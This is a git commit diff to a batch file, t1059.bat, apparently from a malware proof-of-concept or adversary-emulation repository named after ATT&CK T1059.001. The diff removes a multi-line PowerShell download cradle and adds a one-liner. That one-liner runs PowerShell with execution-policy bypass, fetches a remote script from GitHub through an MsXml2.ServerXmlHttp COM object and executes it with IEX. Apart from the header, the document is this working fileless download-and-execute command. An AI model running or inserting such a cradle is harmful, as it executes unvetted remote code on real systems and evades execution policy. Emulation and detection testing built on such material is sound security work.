2957740cba767c4eeebb8b3cb2e18eb581585e71
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2024-11-08 10:19:21 -0300

    Update t1059.bat

--- t1059.bat
+++ t1059.bat
@@ -1,7 +1,1 @@
-$url = 'https://github.com/nicovarvara/mw-poc/raw/refs/heads/main/test-atomic-T1059.001.ps1'
-$method = 'GET'
-$comObject = 'MsXml2.ServerXmlHttp'
-$comMsXml=New-Object -ComObject $comObject
-$comMsXml.Open($method, $url, $False)
-$comMsXml.Send()
-IEX $comMsXml.ResponseText
+powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp; $comMsXml.Open('GET','https://github.com/nicovarvara/mw-poc/raw/refs/heads/main/test-atomic-T1059.001.ps1', $False); $comMsXml.Send(); IEX $comMsXml.ResponseText"
